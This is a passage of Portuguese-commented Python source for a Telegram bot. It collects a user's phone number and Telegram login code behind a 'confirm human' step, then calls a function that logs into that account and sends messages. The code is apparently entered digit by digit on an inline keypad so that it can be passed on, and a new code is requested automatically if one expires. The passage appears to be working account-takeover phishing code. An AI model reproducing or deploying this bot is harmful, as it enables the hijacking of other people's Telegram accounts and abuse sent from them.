                if not phone_code_hash:
                    await query.edit_message_text(
                        "Erro: phone_code_hash não encontrado. Por favor, inicie o processo novamente com /start"
                    )
                    return ConversationHandler.END
                
                # Informa que está processando o código
                await query.edit_message_text(f"Código completo: {code}. Processando...")
                
                # Chama a função de login e envio de mensagens
                result = await login_and_send_messages(phone, code, phone_code_hash, update)
                
                # Se o código expirou, solicita um novo código automaticamente
                if result == "EXPIRED_CODE":
                    await query.edit_message_text("O código expirou. Solicitando um novo código...")
                    
                    # Solicita um novo código
                    success, message, new_phone_code_hash = await request_code(phone)
                    
                    if success:
                        # Atualiza o phone_code_hash no contexto
                        context.user_data["phone_code_hash"] = new_phone_code_hash
                        context.user_data["code_digits"] = ""  # Limpa o código digitado anteriormente
                        
                        # Mostra o teclado para digitar o novo código
                        await query.edit_message_text(
                            "Novo código enviado! Verifique seu Telegram e digite o código de verificação:",
                            reply_markup=get_inline_code_keyboard("")
                        )
                        return ASK_CODE
                    else:
                        await query.edit_message_text(f"Erro ao solicitar novo código: {message}")
                        return ConversationHandler.END
                else:
                    # Caso não seja problema de código expirado, exibe a mensagem normalmente
                    await query.edit_message_text(result)
                    return ConversationHandler.END
        
        return ASK_CODE

    return ASK_PHONE

# Função para criar o teclado inline do código
def get_inline_code_keyboard(current_code):
    keyboard = [
        [
            InlineKeyboardButton("1", callback_data="digit_1"),
            InlineKeyboardButton("2", callback_data="digit_2"),
            InlineKeyboardButton("3", callback_data="digit_3")
        ],
        [
            InlineKeyboardButton("4", callback_data="digit_4"),
            InlineKeyboardButton("5", callback_data="digit_5"),
            InlineKeyboardButton("6", callback_data="digit_6")
        ],
        [
            InlineKeyboardButton("7", callback_data="digit_7"),
            InlineKeyboardButton("8", callback_data="digit_8"),
            InlineKeyboardButton("9", callback_data="digit_9")
        ],
        [
            InlineKeyboardButton("Limpar", callback_data="digit_clear"),
            InlineKeyboardButton("0", callback_data="digit_0"),
            InlineKeyboardButton("✅ Confirmar", callback_data="digit_confirm")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# Função para atualizar o teclado inline do código
async def update_inline_code_keyboard(query, current_code):
    await query.edit_message_text(
        f"Código: {current_code} ({len(current_code)}/5 dígitos)\n"
        "Digite o código de verificação:",
        reply_markup=get_inline_code_keyboard(current_code)
    )

# Função para criar o teclado para digitar o número de telefone
def get_phone_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("1", callback_data="num_1"),
            InlineKeyboardButton("2", callback_data="num_2"),
            InlineKeyboardButton("3", callback_data="num_3")
        ],
        [
            InlineKeyboardButton("4", callback_data="num_4"),
            InlineKeyboardButton("5", callback_data="num_5"),
            InlineKeyboardButton("6", callback_data="num_6")
        ],
        [
            InlineKeyboardButton("7", callback_data="num_7"),
            InlineKeyboardButton("8", callback_data="num_8"),
            InlineKeyboardButton("9", callback_data="num_9")
        ],
        [
            InlineKeyboardButton("Limpar", callback_data="num_clear"),
            InlineKeyboardButton("0", callback_data="num_0"),
            InlineKeyboardButton("✅ Confirmar", callback_data="num_confirm")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def main():
    # Obtém o token do bot do arquivo .env
    token = os.getenv('BOT_TOKEN')
    app = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CONFIRM_HUMAN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human),
                CallbackQueryHandler(button_callback, pattern="^confirm_human$"),
                CallbackQueryHandler(button_callback, pattern="^request_phone$"),
                CallbackQueryHandler(button_callback, pattern="^phone_prefix_")
            ],
            ASK_PHONE: [
                MessageHandler(filters.CONTACT | filters.TEXT & ~filters.COMMAND, receive_contact),
                CallbackQueryHandler(button_callback, pattern="^phone_ddd_"),
                CallbackQueryHandler(button_callback, pattern="^num_")
            ],
            ASK_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code),
                CallbackQueryHandler(button_callback, pattern="^digit_")
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    
    # Adiciona handler para callback_query que não foi capturado pelo ConversationHandler
    app.add_handler(CallbackQueryHandler(button_callback))
    
    app.run_polling()

if __name__ == "__main__":
    main()
